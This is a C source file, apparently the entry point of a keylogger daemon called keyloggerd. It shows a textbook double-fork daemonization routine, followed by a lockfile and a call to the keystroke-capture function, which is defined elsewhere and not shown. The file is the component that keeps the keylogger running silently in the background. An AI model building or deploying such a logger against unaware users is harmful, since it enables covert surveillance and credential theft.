#include <fcntl.h>      /* for open */
#include <signal.h>     /* for sigaction */
#include <sys/resource.h>   /* for getrlimit */
#include <sys/stat.h>   /* for mode_t */
#include <unistd.h>     /* for getpid */

#include "common.h"
#include "error.h"
#include "input-args.h"
#include "keyloggerd.h"
#include "lockfile.h"
#include "logger.h"

#define LOCKFILE "/var/run/keyloggerd.pid"

/**
 * Daemonize the process
 */
static void daemonize(void)
{
    logger.debug("Starting daemon");

    /*
     * Clear file creation mask and set it to a known value.
     */
    mode_t prev_umask, new_mask = 0;

    prev_umask = umask(new_mask);

    logger.debug("umask change: %03o -> %03o", prev_umask, new_mask);

    /*
     * Get the maximum number of file descriptors.
     */
    struct rlimit fd_limit;

    if (getrlimit(RLIMIT_NOFILE, &fd_limit) < 0) {
        err_quit("Cannot get file limit");
    }

    /*
     * Create a new session and become the session leader to lose controlling
     * TTY.
     *
     * A session is a collection ofone or more process groups. e.g. calling:
     * $ proc1 | proc2    # This is a process group consisting of proc1 and
     *                    # proc2
     *
     * Calling setsid() causes three things:
     * 1. The forked child process becomes a session leader.
     * 2. The process will become the process group leader of a new process
     *    group.
     * 3. The process has no controlling terminal (if it had one before the
     *    call, the association between it and the terminal is broken)
     */
    pid_t pid;

    logger.debug("Start [%d]", getpid());

    if ((pid = fork()) < 0) {
        err_quit("Cannot fork");
    } else if (pid != 0) { /* parent */
        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
        exit(EXIT_SUCCESS);
    }

    setsid();

    /*
     * Ensure future opens won't allocate controlling TTYs. We must fork again!
     */
    struct sigaction sa;

    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    if (sigaction(SIGHUP, &sa, NULL) < 0) {
        err_quit("Cannot ignore SIGHUP");
    }

    if ((pid = fork()) < 0) {
        err_quit("Cannot fork");
    } else if (pid != 0) { /* parent */
        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
        exit(EXIT_SUCCESS);
    }

    /*
     * The remaining code in a child process as a daemon. It owns no TTY.
     */

    /*
     * Change the current working directory to the root so we won't prevent file
     * systems from being unmounted.
     */
#if DEBUG
    char working_dir[80];
    getcwd(working_dir, 80);
#else
    char *working_dir = "/";
#endif
    if (chdir(working_dir) < 0) {
        err_quit("Cannot change directory to %s", working_dir);
    }

    logger.debug("Change working directory to %s", working_dir);

    /*
     * Close all open file descriptors
     */
    if (fd_limit.rlim_max == RLIM_INFINITY) {
        fd_limit.rlim_max = 1024;
    }

    for (int k = 0; k < fd_limit.rlim_max; k++) {
        close(k);
    }

    /*
     * Attach file descriptors 0, 1, and 2 (stdin/stdout/stderr) to /dev/null
     */
    int fd0, fd1, fd2;

    fd0 = open("/dev/null", O_RDWR);
    fd1 = dup(0);
    fd2 = dup(0);

    if (fd0 != STDIN_FILENO || fd1 != STDOUT_FILENO || fd2 != STDERR_FILENO) {
        err_quit("Unexpected file descriptors: %d %d %d", fd0, fd1, fd2);
    }

    logger.debug("File descriptors %d, %d, %d -> /dev/null", fd0, fd1, fd2);

    /* Daemon initialization is finished */
}

int main(int argc, char *argv[])
{
    lockfile_t *lf;
    cmd_args_t cmd_args = parse_args(argc, argv);

    logger.open(cmd_args);

    daemonize();

    lf = create_lockfile(LOCKFILE);

    if (lf->lock(lf) == ERROR) {
        err_quit("Aborting: failed to lock %s", lf->file);
    }

    keyloggerd(cmd_args);

    if (lf->unlock(lf) == ERROR) {
        err_quit("Failed to release lock of %s", lf->file);
    }

    destroy_lockfile(lf);

    logger.warn("Stopping daemon");
    logger.close();

    exit(EXIT_SUCCESS);
}
